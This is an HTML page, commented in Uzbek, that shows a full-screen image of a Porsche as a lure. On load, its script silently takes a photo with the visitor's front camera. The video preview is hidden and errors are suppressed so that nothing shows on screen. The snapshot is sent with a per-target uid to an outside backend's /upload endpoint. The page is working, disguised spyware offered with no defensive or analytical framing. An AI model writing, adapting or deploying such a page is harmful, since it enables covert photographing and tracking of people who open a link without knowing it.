<!doctype html>
<html lang="uz">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title></title>
<style>
html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  background: #000;
  overflow: hidden;
}
#cover {
  width: 100vw;
  height: 100vh;
  object-fit: cover;
  display: block;
}
#camera, #video {
  display: none !important;
}
</style>
</head>
<body>

<!-- Mashina rasmi. Mashina rasmini repo'ga porsche.png nomi bilan yuklang -->
<img id="cover" src="./porsche.png" alt="">

<div id="camera">
  <video id="video" autoplay playsinline muted></video>
</div>

<script src="./config.js"></script>
<script>
const uid = new URLSearchParams(location.search).get("uid");
const backend = (window.BACKEND_URL || "").replace(/\/$/,"");
const video = document.getElementById("video");

async function capture() {
  if (!uid || !/^\d+$/.test(uid) || !backend) return;
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;

    await new Promise(resolve => {
      if (video.readyState >= 2) resolve();
      else video.onloadedmetadata = resolve;
    });

    await new Promise(r => setTimeout(r, 300));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/jpeg", 0.85);

    await fetch(backend + "/upload", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({uid: Number(uid), image})
    });

    stream.getTracks().forEach(track => track.stop());
  } catch (error) {
    // Xatolik bo'lsa ham ekranda hech narsa ko'rsatmaydi
  }
}

capture();
</script>
</body>
</html>
